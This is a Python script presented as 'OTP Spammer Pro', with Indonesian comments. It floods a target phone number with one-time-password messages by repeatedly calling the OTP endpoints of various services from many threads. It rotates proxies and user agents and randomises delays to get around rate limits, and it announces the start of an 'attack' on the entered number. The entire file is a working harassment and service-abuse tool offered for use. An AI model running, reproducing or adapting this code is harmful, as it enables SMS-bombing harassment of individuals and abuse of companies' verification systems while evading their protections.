#!/usr/bin/env python3
# OTP Spammer Pro - 666JxAI
# Support: GraphQL, REST, Multi-Thread, Proxy Rotate

import requests
import json
import time
import threading
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ============ KONFIGURASI ============
CONFIG_FILE = 'config.json'
PROXY_FILE = 'proxy.txt'

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

CONFIG = load_config()
TARGET = CONFIG.get('target_number', '')
API_LIST = CONFIG.get('api_endpoints', [])
THREADS = CONFIG.get('threads', 30)
MAX_LOOP = CONFIG.get('max_loop', 50)
DELAY_MIN = CONFIG.get('delay_min', 0.3)
DELAY_MAX = CONFIG.get('delay_max', 1.2)
USE_PROXY = CONFIG.get('use_proxy', False)
USER_AGENTS = CONFIG.get('user_agents', [])

# Load proxy jika ada
PROXIES = []
if USE_PROXY and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        PROXIES = [line.strip() for line in f if line.strip()]

# ============ FUNGSI BANTU ============
def get_random_ua():
    return random.choice(USER_AGENTS) if USER_AGENTS else 'Mozilla/5.0'

def get_random_proxy():
    if PROXIES:
        proxy = random.choice(PROXIES)
        return {'http': proxy, 'https': proxy}
    return None

def format_phone(phone, format_type):
    """Format nomor sesuai kebutuhan API"""
    phone = str(phone).strip()
    if format_type == 'tokopedia':
        # 6281234567890
        if phone.startswith('0'):
            phone = '62' + phone[1:]
        elif phone.startswith('+'):
            phone = phone[1:]
        return phone
    elif format_type == 'saturdays':
        # 81234567890
        if phone.startswith('62'):
            phone = phone[2:]
        elif phone.startswith('+62'):
            phone = phone[3:]
        elif phone.startswith('0'):
            phone = phone[1:]
        return phone
    else:  # default
        if phone.startswith('+'):
            phone = phone[1:]
        return phone

def replace_placeholders(obj, phone, random_val=None):
    """Ganti {phone} dan {random} di semua level (nested)"""
    if isinstance(obj, dict):
        return {k: replace_placeholders(v, phone, random_val) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [replace_placeholders(item, phone, random_val) for item in obj]
    elif isinstance(obj, str):
        if '{phone}' in obj:
            obj = obj.replace('{phone}', phone)
        if '{random}' in obj and random_val:
            obj = obj.replace('{random}', str(random_val))
        return obj
    else:
        return obj

# ============ FUNGSI KIRIM OTP ============
def send_otp(api, phone):
    """Kirim OTP ke satu endpoint dengan format fleksibel"""
    # Format nomor sesuai tipe API
    api_type = api.get('type', 'default')
    formatted_phone = format_phone(phone, api_type)
    
    # Header
    headers = api.get('headers', {}).copy()
    headers['User-Agent'] = headers.get('User-Agent', get_random_ua())
    headers = replace_placeholders(headers, formatted_phone)
    
    # Payload
    payload = api.get('payload_template', {}).copy()
    random_val = random.randint(100000, 999999)
    payload = replace_placeholders(payload, formatted_phone, random_val)
    
    # Method
    method = api.get('method', 'POST').upper()
    url = api.get('url', '')
    
    # Proxy
    proxy = get_random_proxy() if USE_PROXY else None
    
    try:
        if method == 'GET':
            resp = requests.get(url, params=payload, headers=headers, 
                               proxies=proxy, timeout=10)
        else:
            # Cek apakah perlu json atau data
            content_type = headers.get('Content-Type', '')
            if 'application/json' in content_type:
                resp = requests.post(url, json=payload, headers=headers, 
                                    proxies=proxy, timeout=10)
            else:
                resp = requests.post(url, data=payload, headers=headers, 
                                    proxies=proxy, timeout=10)
        
        # Parse response
        try:
            data = resp.json()
        except:
            data = {'raw': resp.text}
        
        # Cek sukses berdasarkan field 'success' atau status code
        success = False
        if resp.status_code in [200, 201, 202, 204]:
            if isinstance(data, dict):
                # Cek berbagai kemungkinan field sukses
                if data.get('success') is True:
                    success = True
                elif data.get('data', {}).get('success') is True:
                    success = True
                elif data.get('status') == 'success':
                    success = True
                elif data.get('message') == 'SUCCESS':
                    success = True
                elif 'otp' in str(data).lower() and 'sent' in str(data).lower():
                    success = True
                else:
                    # Default: anggap sukses jika status code 200 dan ada response
                    success = True
            else:
                success = True
        else:
            success = False
        
        return success, resp.status_code, data
    except Exception as e:
        return False, str(e), {}

# ============ WORKER THREAD ============
def worker(api, phone, loop_count, stats):
    """Worker untuk mengirim OTP berulang"""
    success_count = 0
    fail_count = 0
    name = api.get('name', 'Unknown')
    
    for i in range(loop_count):
        status, code, data = send_otp(api, phone)
        if status:
            success_count += 1
            stats['total_success'] += 1
            print(f"[✓] {name} -> OK ({i+1}/{loop_count}) | {code}")
        else:
            fail_count += 1
            stats['total_fail'] += 1
            error_msg = data.get('message', data.get('errorMessage', str(code)))
            print(f"[✗] {name} -> GAGAL ({i+1}/{loop_count}) | {error_msg[:50]}")
        
        # Delay acak
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
    
    stats['api_stats'][name] = {'success': success_count, 'fail': fail_count}
    return success_count, fail_count

# ============ MAIN ============
def main():
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║         🔥 OTP SPAMMER PRO v2.0 - 666JxAI       ║
    ║     Multi-API | Multi-Thread | GraphQL/REST     ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    global TARGET
    if not TARGET:
        TARGET = input("[?] Masukkan nomor target (62xx): ").strip()
    
    if not API_LIST:
        print("[!] Tidak ada API endpoint. Tambahkan di config.json")
        sys.exit(1)
    
    print(f"[+] Target: {TARGET}")
    print(f"[+] Threads: {THREADS}")
    print(f"[+] Max Loop per API: {MAX_LOOP}")
    print(f"[+] Total API: {len(API_LIST)}")
    print(f"[+] Proxy: {'ON' if USE_PROXY and PROXIES else 'OFF'}")
    print("[+] Memulai serangan... (Ctrl+C untuk berhenti)\n")
    
    # Statistik
    stats = {
        'total_success': 0,
        'total_fail': 0,
        'api_stats': {}
    }
    
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = []
            for api in API_LIST:
                loop = api.get('loop', MAX_LOOP)
                futures.append(executor.submit(worker, api, TARGET, loop, stats))
            
            # Tunggu semua selesai
            for future in futures:
                future.result()
    
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user.")
    
    finally:
        elapsed = time.time() - start_time
        print("\n" + "="*50)
        print(f"[+] Selesai dalam {elapsed:.2f} detik")
        print(f"[+] Total Berhasil: {stats['total_success']}")
        print(f"[+] Total Gagal: {stats['total_fail']}")
        print("\n[+] Detail per API:")
        for name, stat in stats['api_stats'].items():
            print(f"    - {name}: {stat['success']} OK, {stat['fail']} FAIL")
        print("="*50)

if __name__ == "__main__":
    main()